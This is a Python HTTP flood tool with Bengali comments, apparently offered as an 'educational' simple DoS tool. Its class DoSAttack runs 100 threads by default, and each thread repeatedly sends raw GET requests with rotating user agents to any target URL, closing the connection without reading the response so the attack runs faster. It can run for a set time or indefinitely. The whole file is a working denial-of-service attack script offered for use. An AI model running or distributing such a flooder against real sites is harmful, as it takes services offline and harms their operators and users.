
import sys
import time
import threading
import socket
import random
import argparse
from urllib.parse import urlparse

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
]

class DoSAttack:
    def __init__(self, target_url, num_threads=100, duration=30, delay=0):
        """
        target_url: আক্রমণের লক্ষ্য (যেমন https://example.com)
        num_threads: কতগুলো থ্রেড একসাথে চলবে
        duration: কত সেকেন্ড আক্রমণ চলবে (0 মানে সীমাহীন)
        delay: প্রতিটি রিকোয়েস্টের পর সেকেন্ডে বিরতি
        """
        self.target_url = target_url
        self.num_threads = num_threads
        self.duration = duration
        self.delay = delay
        self.stop_attack = False
        self.threads = []
        self.request_count = 0
        self.lock = threading.Lock()

        # URL পার্স করে হোস্ট, পোর্ট, পাথ বের করি
        parsed = urlparse(target_url)
        self.host = parsed.hostname
        self.path = parsed.path or '/'
        if parsed.query:
            self.path += '?' + parsed.query

        # পোর্ট নির্ধারণ
        if parsed.scheme == 'https':
            self.port = 443
            self.use_ssl = True
        else:
            self.port = 80
            self.use_ssl = False

    def send_request(self):
        """একটি HTTP রিকোয়েস্ট তৈরি করে পাঠায়"""
        try:
            # সকেট তৈরি
            if self.use_ssl:
                # HTTPS-এর জন্য SSL র‍্যাপার লাগবে, কিন্তু সহজ রাখতে HTTP দিয়েই কাজ চালাই
                # বাস্তবে HTTPS সাপোর্ট যুক্ত করতে পারেন, তবে শিক্ষামূলক প্রকল্পে HTTP-ই যথেষ্ট
                pass
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.host, self.port))

            # র্যান্ডম ইউজার-এজেন্ট নির্বাচন
            user_agent = random.choice(USER_AGENTS)

            # HTTP GET রিকোয়েস্ট তৈরি
            request = f"GET {self.path} HTTP/1.1\r\n"
            request += f"Host: {self.host}\r\n"
            request += f"User-Agent: {user_agent}\r\n"
            request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
            request += "Accept-Language: en-US,en;q=0.5\r\n"
            request += "Connection: keep-alive\r\n"
            request += "\r\n"

            sock.send(request.encode())
            # সাড়া পড়ার অপেক্ষা না করে সংযোগ বন্ধ করি (দ্রুত আক্রমণের জন্য)
            sock.close()

            with self.lock:
                self.request_count += 1

        except Exception:
            pass  # কোনো ত্রুটি উপেক্ষা করি

    def worker(self):
        """প্রতিটি থ্রেডের কাজ: delay থাকলে অপেক্ষা করে রিকোয়েস্ট পাঠানো"""
        while not self.stop_attack:
            self.send_request()
            if self.delay > 0:
                time.sleep(self.delay)

    def start(self):
        """আক্রমণ শুরু করে"""
        print(f"[*] আক্রমণ শুরু হচ্ছে: {self.target_url}")
        print(f"[*] থ্রেড: {self.num_threads}, সময়: {self.duration} সেকেন্ড, বিরতি: {self.delay} সেকেন্ড")
        print("[*] বন্ধ করতে Ctrl+C চাপুন...")

        # থ্রেড তৈরি ও শুরু
        for _ in range(self.num_threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            self.threads.append(t)

        start_time = time.time()

        try:
            while True:
                # নির্দিষ্ট সময় পর আক্রমণ বন্ধ করার চেক
                if self.duration > 0 and (time.time() - start_time) >= self.duration:
                    break
                time.sleep(0.5)  # প্রতি ০.৫ সেকেন্ডে স্ট্যাটাস দেখা যায়
        except KeyboardInterrupt:
            print("\n[!] ব্যবহারকারী বন্ধ করেছেন।")
        finally:
            self.stop_attack = True
            # সব থ্রেড শেষ হওয়া পর্যন্ত অপেক্ষা
            for t in self.threads:
                t.join(timeout=1)
            print(f"[+] আক্রমণ শেষ। মোট রিকোয়েস্ট পাঠানো হয়েছে: {self.request_count}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="সিম্পল DoS টুল (শিক্ষামূলক)")
    parser.add_argument("target", help="টার্গেট URL (যেমন http://example.com)")
    parser.add_argument("-t", "--threads", type=int, default=100, help="থ্রেড সংখ্যা (ডিফল্ট: 100)")
    parser.add_argument("-d", "--duration", type=int, default=30, help="আক্রমণের সময়কাল সেকেন্ডে (0 = সীমাহীন, ডিফল্ট: 30)")
    parser.add_argument("-w", "--wait", type=float, default=0, help="প্রতি রিকোয়েস্টের পর বিরতি সেকেন্ডে (ডিফল্ট: 0)")

    args = parser.parse_args()

    # যাচাই করি URL ঠিক আছে কিনা
    if not args.target.startswith(('http://', 'https://')):
        args.target = 'http://' + args.target

    attack = DoSAttack(
        target_url=args.target,
        num_threads=args.threads,
        duration=args.duration,
        delay=args.wait
    )
    attack.start()
